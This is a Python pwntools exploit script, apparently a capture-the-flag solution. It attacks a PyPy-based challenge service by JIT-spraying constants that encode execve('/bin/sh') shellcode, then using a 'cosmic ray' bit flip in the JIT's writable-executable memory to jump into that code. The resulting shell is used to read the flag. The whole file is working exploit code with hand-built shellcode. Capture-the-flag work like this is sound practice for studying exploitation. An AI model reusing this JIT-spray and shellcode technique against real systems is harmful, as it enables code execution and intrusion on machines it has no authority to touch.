#!/usr/bin/env python3
#
# @mebeim - 2025-08-28
#

import sys
from os import getenv

from pwn import context, log, remote


HOST = getenv('HOST', 'localhost')
PORT = int(getenv('PORT', '1337'))

# Offset of byte to flip into PyPy JIT RWX VMA
COSMIC_RAY_RWX_OFF = 0x2a25


def get_cosmic_ray_offset(r: remote):
	r.sendlineafter(b'> ', b'T')
	r.sendlineafter(b'Where? ', b'99999999999999999')

	off = 0
	while 1:
		r.recvuntil(b'Cosmic ray spares ')
		sz = int(r.recvuntil(b' bytes', drop=True), 0)
		if sz == 0x100000:
			break

		off += sz

	r.recvuntil(b'Invalid position')
	return (off + COSMIC_RAY_RWX_OFF) * 8 + 3


def create_func(r: remote, name: str, ops: list[str]):
	r.sendlineafter(b'> ', b'B')
	r.sendlineafter(b'Name: ', name.encode())

	for op in ops:
		r.sendlineafter(b'> ', op.encode())
	r.sendlineafter(b'> ', b'END')


def call_func(r: remote, name: str, arg: int=0) -> bytes:
	r.sendlineafter(b'> ', b'C')
	r.sendlineafter(b'Name: ', name.encode())
	r.sendlineafter(b'Argument: ', str(arg).encode())


def cosmic_ray(r: remote, where: int):
	r.sendlineafter(b'> ', b'T')
	r.sendlineafter(b'Where? ', str(where).encode())


def build_function_insns() -> list[str]:
	return [
		'ADD 0x01010101011ceb90', # jmp short $+0x1e
		'ADD 0x17eb900068732f68', # push 0x68732f; jmp short $+0x19
		'ADD 0x17eb90102424c148', # shl qword ptr [rsp], 16; jmp short $+0x19
		'ADD 0x17eb6e6924048166', # add word ptr [rsp], 0x6e69; jmp short $+0x19
		'ADD 0x17eb90102424c148', # shl qword ptr [rsp], 16; jmp short $+0x19
		'ADD 0x616161000000ede9', # jmp $+0xf2
		'ADD 0x61eb622f24048166', # add word ptr [rsp], 0x622f; jmp short $+0x63
		'ADD 0x61eb90006ae78948', # mov rdi, rsp; push 0; jmp short $+0x63
		'ADD 0x61eb9090e6894857', # push rdi; mov rsi, rsp; jmp short $+0x63
		'ADD 0x61eb3bb0c031d231', # xor edx, edx; xor eax, eax; mov al, 0x3b; jmp short $+0x63
		'ADD 0x61eb90909090050f', # syscall
		'REPEAT 10000',
		'LIST'
	]


def run(function_insns: list[str]):
	r = remote(HOST, PORT)

	create_func(r, 'f', function_insns)
	call_func(r, 'f')
	cosmic_ray(r, get_cosmic_ray_offset(r))
	call_func(r, 'f')

	if r.recvline(timeout=0.5) != b'':
		log.failure('Exploit unsuccessful')
		r.close()
		return False

	r.sendline(b'cat flag')

	flag = r.recvline(timeout=1)
	if flag == b'':
		log.failure('Timed out waiting for flag')
		r.close()
		return False

	flag = flag.strip()
	if not flag.startswith(b'space{'):
		log.failure('Could not get flag')
		r.close()
		return False

	print(flag.decode())
	r.close()
	return True


def main() -> int:
	context(arch='amd64')
	function_insns = build_function_insns()

	for i in range(10):
		log.info('Attempt %d', i + 1)

		try:
			if run(function_insns):
				return 0
		except EOFError:
			log.failure('EOF')

	log.failure('Exceeded max exploit attempts!')
	return 1


if __name__ == '__main__':
	sys.exit(main())
